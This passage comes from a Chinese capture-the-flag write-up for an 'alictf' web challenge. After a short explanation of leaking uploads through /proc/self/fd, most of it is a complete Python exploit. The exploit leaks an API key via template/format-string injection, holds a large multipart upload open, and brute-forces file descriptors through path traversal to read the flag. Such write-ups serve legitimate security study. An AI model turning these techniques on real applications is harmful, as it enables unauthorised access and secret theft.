+</span></span></code></pre></div><p>网上可以查到，在 Linux 中，<code>/proc/self/fd/</code> 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（<code>wsgi.input</code>）或者因请求体过大而产生的临时缓存文件，所以我们可以爆破 fd 去泄露 flag 内容</p>
+<p>但是又有一个问题，我们怎么才能产生大缓存呢？🥸</p>
+<p>而是 /heartbeat 解析外部大 multipart/form-data 时生成的临时上传文件 fd，exp 如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Optional</span><span class="p">,</span> <span class="n">Tuple</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">API_KEY_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([a-f0-9]</span><span class="si">{64}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">FLAG_FILE_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;flag-[a-f0-9]</span><span class="si">{32}</span><span class="s2">\.txt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">FLAG_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(alictf\{[^}]+\})&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_api_key</span><span class="p">(</span><span class="n">base_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="si">{0.view_functions[admin].__globals__[API_KEY]}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;--x</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Disposition: form-data; name=&#34;action&#34;; filename=&#34;1&#34;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;{&#34;type&#34;:&#34;debug&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/heartbeat&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;client&#34;</span><span class="p">:</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=x&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;text&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">API_KEY_RE</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;failed to leak API key: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">!r}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_large_multipart</span><span class="p">(</span><span class="n">boundary</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">injected_template</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">pad_size</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Disposition: form-data; name=&#34;text&#34;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;x</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Disposition: form-data; name=&#34;client&#34;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;foo</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Disposition: form-data; name=&#34;token&#34;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bar</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Disposition: form-data; name=&#34;blob&#34;; filename=&#34;blob.txt&#34;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type: text/plain</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">--</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">+</span> <span class="n">injected_template</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">pad_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hold_large_upload</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">body</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">boundary</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">hold_after</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">hold_seconds</span><span class="p">:</span> <span class="nb">float</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">,</span> <span class="nb">dict</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">worker</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">request</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;POST /heartbeat HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;Host: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;Content-Type: multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;Content-Length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Connection: close</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">body</span><span class="p">[:</span><span class="n">hold_after</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">[</span><span class="s2">&#34;first_chunk_sent&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">hold_seconds</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">body</span><span class="p">[</span><span class="n">hold_after</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">+=</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">[</span><span class="s2">&#34;response_head&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">[</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">exc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">thread</span><span class="p">,</span> <span class="n">state</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_flag_filename</span><span class="p">(</span><span class="n">base_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">api_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">fd_start</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">fd_end</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">scan_rounds</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">int</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">api_key</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">scan_rounds</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">fd_start</span><span class="p">,</span> <span class="n">fd_end</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;tmpl&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;../../../../proc/self/fd/</span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">RequestException</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">match</span> <span class="o">=</span> <span class="n">FLAG_FILE_RE</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">fd</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.02</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;failed to find flag filename from proc fd scan&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_flag</span><span class="p">(</span><span class="n">base_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">api_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">flag_file</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">api_key</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;tmpl&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;/</span><span class="si">{</span><span class="n">flag_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">FLAG_RE</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;failed to extract flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">!r}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_host_port</span><span class="p">(</span><span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">target</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">target</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">base_url</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host_port</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^https?://&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">base_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host_port</span> <span class="o">=</span> <span class="n">target</span>
+</span></span><span class="line"><span class="cl">        <span class="n">base_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;:&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">host_port</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;target must include host:port&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="p">,</span> <span class="n">port_str</span> <span class="o">=</span> <span class="n">host_port</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port_str</span><span class="p">),</span> <span class="n">base_url</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&#34;attachment_cutter exploit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;target&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nargs</span><span class="o">=</span><span class="s2">&#34;?&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">default</span><span class="o">=</span><span class="s2">&#34;223.6.249.127:54789&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">help</span><span class="o">=</span><span class="s2">&#34;target in host:port or http://host:port format&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--pad-size&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">700000</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;bytes appended after SSTI payload&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--hold-after&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">600000</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;bytes to send before pausing&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--hold-seconds&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">float</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mf">10.0</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;pause duration while scanning fds&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--fd-start&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;start fd to scan&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--fd-end&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;end fd to scan&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--scan-rounds&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">400</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;how many scan loops to run&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
